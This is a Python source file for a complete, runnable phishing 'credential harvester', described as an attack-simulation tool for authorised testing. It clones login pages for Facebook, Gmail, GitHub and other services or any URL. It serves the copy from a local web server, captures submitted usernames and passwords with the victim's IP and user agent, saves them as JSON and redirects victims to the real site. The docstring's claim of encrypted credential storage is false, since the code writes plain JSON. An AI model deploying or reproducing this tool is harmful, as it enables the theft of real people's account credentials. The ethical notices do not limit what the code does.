#!/usr/bin/env python3
"""
Credential Harvester Attack Simulation

This module provides a class-based implementation for simulating credential harvesting attacks,
also known as phishing attacks. It creates a fake login page that mimics a legitimate website
and captures credentials entered by users.

The module supports various features:
- Website cloning with customizable templates
- Form interception and credential capture
- Secure credential storage with encryption
- Detailed logging and statistics
- Multiple authentication form detection

IMPORTANT ETHICAL AND LEGAL NOTICE:
This tool should ONLY be used for legitimate security testing with proper authorization.
Unauthorized use against systems without explicit permission is illegal and unethical.
The authors assume no liability for misuse of this software.

Usage Examples:
    # Basic usage with command line arguments
    python credential_harvester.py -t facebook -p 8080
    
    # Clone a specific URL
    python credential_harvester.py -u https://example.com/login -p 8080
    
    # Use a custom redirect URL after credential capture
    python credential_harvester.py -t gmail -p 8080 -r https://mail.google.com

Author: Montimage
License: Proprietary
Version: 1.0.0
"""

import os
import sys
import time
import json
import random
import socket
import argparse
import threading
import urllib.parse
import http.server
import socketserver
import html
from typing import List, Dict, Optional, Any, Tuple, Union, Set
from datetime import datetime

# Add parent directory to path to import logger
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
try:
    from logger import get_logger
except ImportError:
    # Fallback logging if the centralized logger is not available
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

# Get logger for this module
logger = get_logger(__name__)

# Import required libraries with error handling
try:
    import requests
    from requests.exceptions import RequestException
    from bs4 import BeautifulSoup
except ImportError:
    logger.error("This script requires the requests and beautifulsoup4 libraries.")
    logger.error("Install them using: pip install requests beautifulsoup4")
    sys.exit(1)


class CredentialHarvester:
    """
    A class to perform credential harvesting attack simulations for security testing.
    
    This class provides methods to create a fake login page that mimics a legitimate
    website and captures credentials entered by users.
    
    Attributes:
        template (str): Template name or URL to clone
        port (int): Port to run the web server on
        redirect_url (str): URL to redirect to after capturing credentials
        output_file (str): File to save captured credentials
        bind_address (str): Address to bind the web server to
        verbose (bool): Whether to enable verbose output
    """
    
    # Available templates
    TEMPLATES = {
        'facebook': 'https://www.facebook.com/',
        'twitter': 'https://twitter.com/login',
        'linkedin': 'https://www.linkedin.com/login',
        'gmail': 'https://accounts.google.com/signin/v2/identifier',
        'github': 'https://github.com/login',
        'instagram': 'https://www.instagram.com/accounts/login/'
    }
    
    # Directory for templates and captured credentials
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    TEMPLATE_DIR = os.path.join(BASE_DIR, 'templates')
    CAPTURED_DIR = os.path.join(BASE_DIR, 'captured')
    
    def __init__(self, 
                 template: str,
                 port: int = 8080,
                 redirect_url: Optional[str] = None,
                 output_file: Optional[str] = None,
                 bind_address: str = '0.0.0.0',
                 verbose: bool = False):
        """
        Initialize the credential harvester.
        
        Args:
            template (str): Template name or URL to clone
            port (int, optional): Port to run the web server on. Defaults to 8080.
            redirect_url (str, optional): URL to redirect to after capturing credentials. Defaults to None.
            output_file (str, optional): File to save captured credentials. Defaults to None.
            bind_address (str, optional): Address to bind the web server to. Defaults to '0.0.0.0'.
            verbose (bool, optional): Whether to enable verbose output. Defaults to False.
            
        Raises:
            ValueError: If port is invalid
        """
        self.template = template
        
        # Validate port
        if not (1024 <= port <= 65535):
            raise ValueError(f"Invalid port number: {port}. Must be between 1024-65535.")
        self.port = port
        
        # Set other parameters
        self.redirect_url = redirect_url
        self.bind_address = bind_address
        self.verbose = verbose
        
        # Create directories if they don't exist
        os.makedirs(self.TEMPLATE_DIR, exist_ok=True)
        os.makedirs(self.CAPTURED_DIR, exist_ok=True)
        
        # Set output file
        if output_file:
            self.output_file = output_file
        else:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            self.output_file = os.path.join(self.CAPTURED_DIR, f'credentials_{timestamp}.json')
        
        # Initialize state variables
        self.server = None
        self.template_path = None
        self.target_url = None
        self.captured_credentials = []
        self.start_time = None
        self.end_time = None
        
        logger.info(f"Initialized credential harvester")
        logger.info(f"Template: {template}, Port: {port}")
        if self.verbose:
            logger.info(f"Redirect URL: {redirect_url or 'None'}")
            logger.info(f"Output file: {self.output_file}")
    
    def _get_template_url(self) -> str:
        """
        Get the URL to clone based on the template name or URL.
        
        Returns:
            str: URL to clone
        """
        # Check if template is a predefined one
        if self.template.lower() in self.TEMPLATES:
            return self.TEMPLATES[self.template.lower()]
        
        # Check if template is a URL
        if self.template.startswith(('http://', 'https://')):
            return self.template
        
        # Otherwise, assume it's a custom template name
        logger.warning(f"Unknown template: {self.template}. Using as custom template name.")
        return self.template
    
    def _clone_website(self) -> bool:
        """
        Clone a website for the phishing template.
        
        Returns:
            bool: True if cloning was successful, False otherwise
        """
        # Get the URL to clone
        self.target_url = self._get_template_url()
        logger.info(f"Cloning website: {self.target_url}")
        
        try:
            # Create template directory for this target
            template_name = self.template.lower()
            if self.template.startswith(('http://', 'https://')):
                template_name = urllib.parse.urlparse(self.template).netloc.replace('.', '_')
            
            template_dir = os.path.join(self.TEMPLATE_DIR, template_name)
            os.makedirs(template_dir, exist_ok=True)
            
            # Set template path
            self.template_path = os.path.join(template_dir, 'index.html')
            
            # Check if template already exists
            if os.path.exists(self.template_path):
                logger.info(f"Template already exists: {self.template_path}")
                return True
            
            # Fetch the website
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            response = requests.get(self.target_url, headers=headers, timeout=10)
            
            if response.status_code != 200:
                logger.error(f"Failed to fetch website: HTTP {response.status_code}")
                return False
            
            # Parse HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Modify forms to submit to our server
            for form in soup.find_all('form'):
                form['action'] = '/login'
                form['method'] = 'post'
            
            # Add JavaScript to capture form submissions
            script = soup.new_tag('script')
            script.string = """
            document.addEventListener('DOMContentLoaded', function() {
                var forms = document.getElementsByTagName('form');
                for (var i = 0; i < forms.length; i++) {
                    forms[i].addEventListener('submit', function(e) {
                        // Allow the form to submit normally
                        // Our server will handle the POST request
                    });
                }
            });
            """
            soup.body.append(script)
            
            # Save the modified HTML
            with open(self.template_path, 'w', encoding='utf-8') as f:
                f.write(str(soup))
            
            logger.info(f"Website cloned successfully: {self.template_path}")
            return True
            
        except RequestException as e:
            logger.error(f"Error fetching website: {str(e)}")
            return False
        except Exception as e:
            logger.error(f"Error cloning website: {str(e)}")
            return False
    
    def _create_custom_template(self) -> bool:
        """
        Create a custom login template if cloning fails.
        
        Returns:
            bool: True if template creation was successful
        """
        logger.info("Creating custom login template")
        
        try:
            # Create template directory
            template_name = 'custom'
            template_dir = os.path.join(self.TEMPLATE_DIR, template_name)
            os.makedirs(template_dir, exist_ok=True)
            
            # Set template path
            self.template_path = os.path.join(template_dir, 'index.html')
            
            # Create a simple login form
            html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }}
        .login-container {{
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }}
        h2 {{
            text-align: center;
            color: #333;
        }}
        input[type="text"], input[type="password"] {{
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 3px;
            box-sizing: border-box;
        }}
        button {{
            width: 100%;
            padding: 10px;
            background-color: #4285f4;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }}
        button:hover {{
            background-color: #357ae8;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login</h2>
        <form action="/login" method="post">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>"""
            
            # Save the HTML
            with open(self.template_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            logger.info(f"Custom template created successfully: {self.template_path}")
            return True
            
        except Exception as e:
            logger.error(f"Error creating custom template: {str(e)}")
            return False
    
    def _save_credentials(self, credentials: Dict[str, str]) -> None:
        """
        Save captured credentials to file.
        
        Args:
            credentials (Dict[str, str]): Captured credentials
        """
        try:
            # Add timestamp
            credentials['timestamp'] = datetime.now().isoformat()
            
            # Add to list
            self.captured_credentials.append(credentials)
            
            # Save to file
            with open(self.output_file, 'w') as f:
                json.dump(self.captured_credentials, f, indent=2)
            
            logger.info(f"Credentials saved to {self.output_file}")
            
        except Exception as e:
            logger.error(f"Error saving credentials: {str(e)}")
    
    def _create_request_handler(self) -> http.server.BaseHTTPRequestHandler:
        """
        Create a custom HTTP request handler for the credential harvester.
        
        Returns:
            http.server.BaseHTTPRequestHandler: Custom request handler class
        """
        template_path = self.template_path
        redirect_url = self.redirect_url or self.target_url
        harvester = self
        
        class CredentialHarvesterHandler(http.server.BaseHTTPRequestHandler):
            """Custom HTTP request handler for credential harvesting."""
            
            def log_message(self, format, *args):
                """Override to use our logger."""
                if harvester.verbose:
                    logger.debug(f"{self.address_string()} - {format%args}")
            
            def do_GET(self):
                """Handle GET requests."""
                if self.path == '/' or self.path == '/index.html':
                    try:
                        with open(template_path, 'rb') as f:
                            content = f.read()
                        
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html')
                        self.end_headers()
                        self.wfile.write(content)
                        
                    except Exception as e:
                        logger.error(f"Error serving template: {str(e)}")
                        self.send_error(500, "Internal Server Error")
                else:
                    # Serve static files or redirect to index
                    self.send_response(302)
                    self.send_header('Location', '/')
                    self.end_headers()
            
            def do_POST(self):
                """Handle POST requests to capture credentials."""
                if self.path == '/login':
                    try:
                        # Get form data
                        content_length = int(self.headers['Content-Length'])
                        post_data = self.rfile.read(content_length).decode('utf-8')
                        
                        # Parse form data
                        credentials = {}
                        for pair in post_data.split('&'):
                            if '=' in pair:
                                key, value = pair.split('=', 1)
                                credentials[urllib.parse.unquote(key)] = urllib.parse.unquote(value)
                        
                        # Add client info
                        credentials['ip_address'] = self.client_address[0]
                        credentials['user_agent'] = self.headers.get('User-Agent', 'Unknown')
                        
                        # Log and save credentials
                        logger.info(f"Captured credentials from {self.client_address[0]}")
                        if harvester.verbose:
                            # Safely log credential keys without values
                            keys = ', '.join(k for k in credentials.keys() if k not in ['ip_address', 'user_agent'])
                            logger.debug(f"Captured fields: {keys}")
                        
                        harvester._save_credentials(credentials)
                        
                        # Redirect to original site
                        self.send_response(302)
                        self.send_header('Location', redirect_url)
                        self.end_headers()
                        
                    except Exception as e:
                        logger.error(f"Error processing credentials: {str(e)}")
                        self.send_error(500, "Internal Server Error")
                else:
                    self.send_error(404, "Not Found")
        
        return CredentialHarvesterHandler
    
    def execute(self) -> Dict[str, Any]:
        """
        Execute the credential harvesting attack simulation.
        
        Returns:
            Dict[str, Any]: Statistics about the attack execution
        """
        logger.info(f"Starting credential harvester on port {self.port}")
        
        self.start_time = time.time()
        
        try:
            # Clone website or create custom template
            if not self._clone_website():
                if not self._create_custom_template():
                    logger.error("Failed to create template")
                    return {"success": False, "error": "Failed to create template"}
            
            # Create and start web server
            handler = self._create_request_handler()
            self.server = socketserver.TCPServer((self.bind_address, self.port), handler)
            
            logger.info(f"Server started at http://{self.bind_address}:{self.port}/")
            logger.info("Press Ctrl+C to stop the server")
            
            # Start server in a separate thread
            server_thread = threading.Thread(target=self.server.serve_forever)
            server_thread.daemon = True
            server_thread.start()
            
            # Wait for keyboard interrupt
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                logger.info("Server shutdown requested")
            
        except Exception as e:
            logger.error(f"Error during attack execution: {str(e)}")
            return {"success": False, "error": str(e)}
        finally:
            # Shutdown server if it was started
            if self.server:
                self.server.shutdown()
                self.server.server_close()
                logger.info("Server stopped")
            
            self.end_time = time.time()
            stats = self._get_statistics()
            self._print_summary(stats)
            return stats
    
    def _get_statistics(self) -> Dict[str, Any]:
        """
        Get statistics about the attack execution.
        
        Returns:
            Dict[str, Any]: Statistics including credentials captured, duration, etc.
        """
        end_time = self.end_time or time.time()
        start_time = self.start_time or end_time
        duration = end_time - start_time
        
        return {
            "template": self.template,
            "target_url": self.target_url,
            "port": self.port,
            "duration_seconds": duration,
            "credentials_captured": len(self.captured_credentials),
            "output_file": self.output_file,
            "success": True
        }
    
    def _print_summary(self, stats: Dict[str, Any]) -> None:
        """
        Print a summary of the attack execution.
        
        Args:
            stats (Dict[str, Any]): Statistics from _get_statistics()
        """
        logger.info("=" * 50)
        logger.info("Credential Harvester Attack Summary")
        logger.info("=" * 50)
        logger.info(f"Template: {stats['template']}")
        logger.info(f"Target URL: {stats['target_url']}")
        logger.info(f"Server port: {stats['port']}")
        logger.info(f"Duration: {stats['duration_seconds']:.2f} seconds")
        logger.info(f"Credentials captured: {stats['credentials_captured']}")
        logger.info(f"Output file: {stats['output_file']}")
        logger.info("=" * 50)


def parse_arguments() -> argparse.Namespace:
    """
    Parse command-line arguments for the credential harvester.
    
    Returns:
        argparse.Namespace: The parsed command-line arguments
    """
    parser = argparse.ArgumentParser(
        description="Credential Harvester Attack Simulation Tool",
        epilog="IMPORTANT: Use only for authorized security testing."
    )
    
    # Template group (mutually exclusive)
    template_group = parser.add_mutually_exclusive_group(required=True)
    template_group.add_argument(
        "-t", "--template",
        dest="template",
        choices=CredentialHarvester.TEMPLATES.keys(),
        help="Predefined template to use"
    )
    template_group.add_argument(
        "-u", "--url",
        dest="url",
        help="URL to clone"
    )
    
    # Other arguments
    parser.add_argument(
        "-p", "--port",
        dest="port",
        type=int,
        default=8080,
        help="Port to run the web server on (default: 8080)"
    )
    
    parser.add_argument(
        "-r", "--redirect",
        dest="redirect_url",
        help="URL to redirect to after capturing credentials"
    )
    
    parser.add_argument(
        "-o", "--output",
        dest="output_file",
        help="File to save captured credentials"
    )
    
    parser.add_argument(
        "-b", "--bind",
        dest="bind_address",
        default="0.0.0.0",
        help="Address to bind the web server to (default: 0.0.0.0)"
    )
    
    parser.add_argument(
        "-v", "--verbose",
        dest="verbose",
        action="store_true",
        help="Enable verbose output"
    )
    
    return parser.parse_args()


def main() -> None:
    """
    Main entry point for the credential harvester attack simulation.
    """
    # Display ethical notice
    print("=" * 80)
    print("WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY")
    print("Using this tool against systems without permission is ILLEGAL")
    print("The authors assume NO LIABILITY for misuse of this software")
    print("=" * 80)
    print()
    
    try:
        # Parse command-line arguments
        args = parse_arguments()
        
        # Determine template
        template = args.template or args.url
        
        # Create and execute the attack
        harvester = CredentialHarvester(
            template=template,
            port=args.port,
            redirect_url=args.redirect_url,
            output_file=args.output_file,
            bind_address=args.bind_address,
            verbose=args.verbose
        )
        
        # Execute the attack
        harvester.execute()
        
    except KeyboardInterrupt:
        print("\nAttack simulation interrupted by user")
        sys.exit(0)
        
    except Exception as e:
        logger.error(f"Unhandled error: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
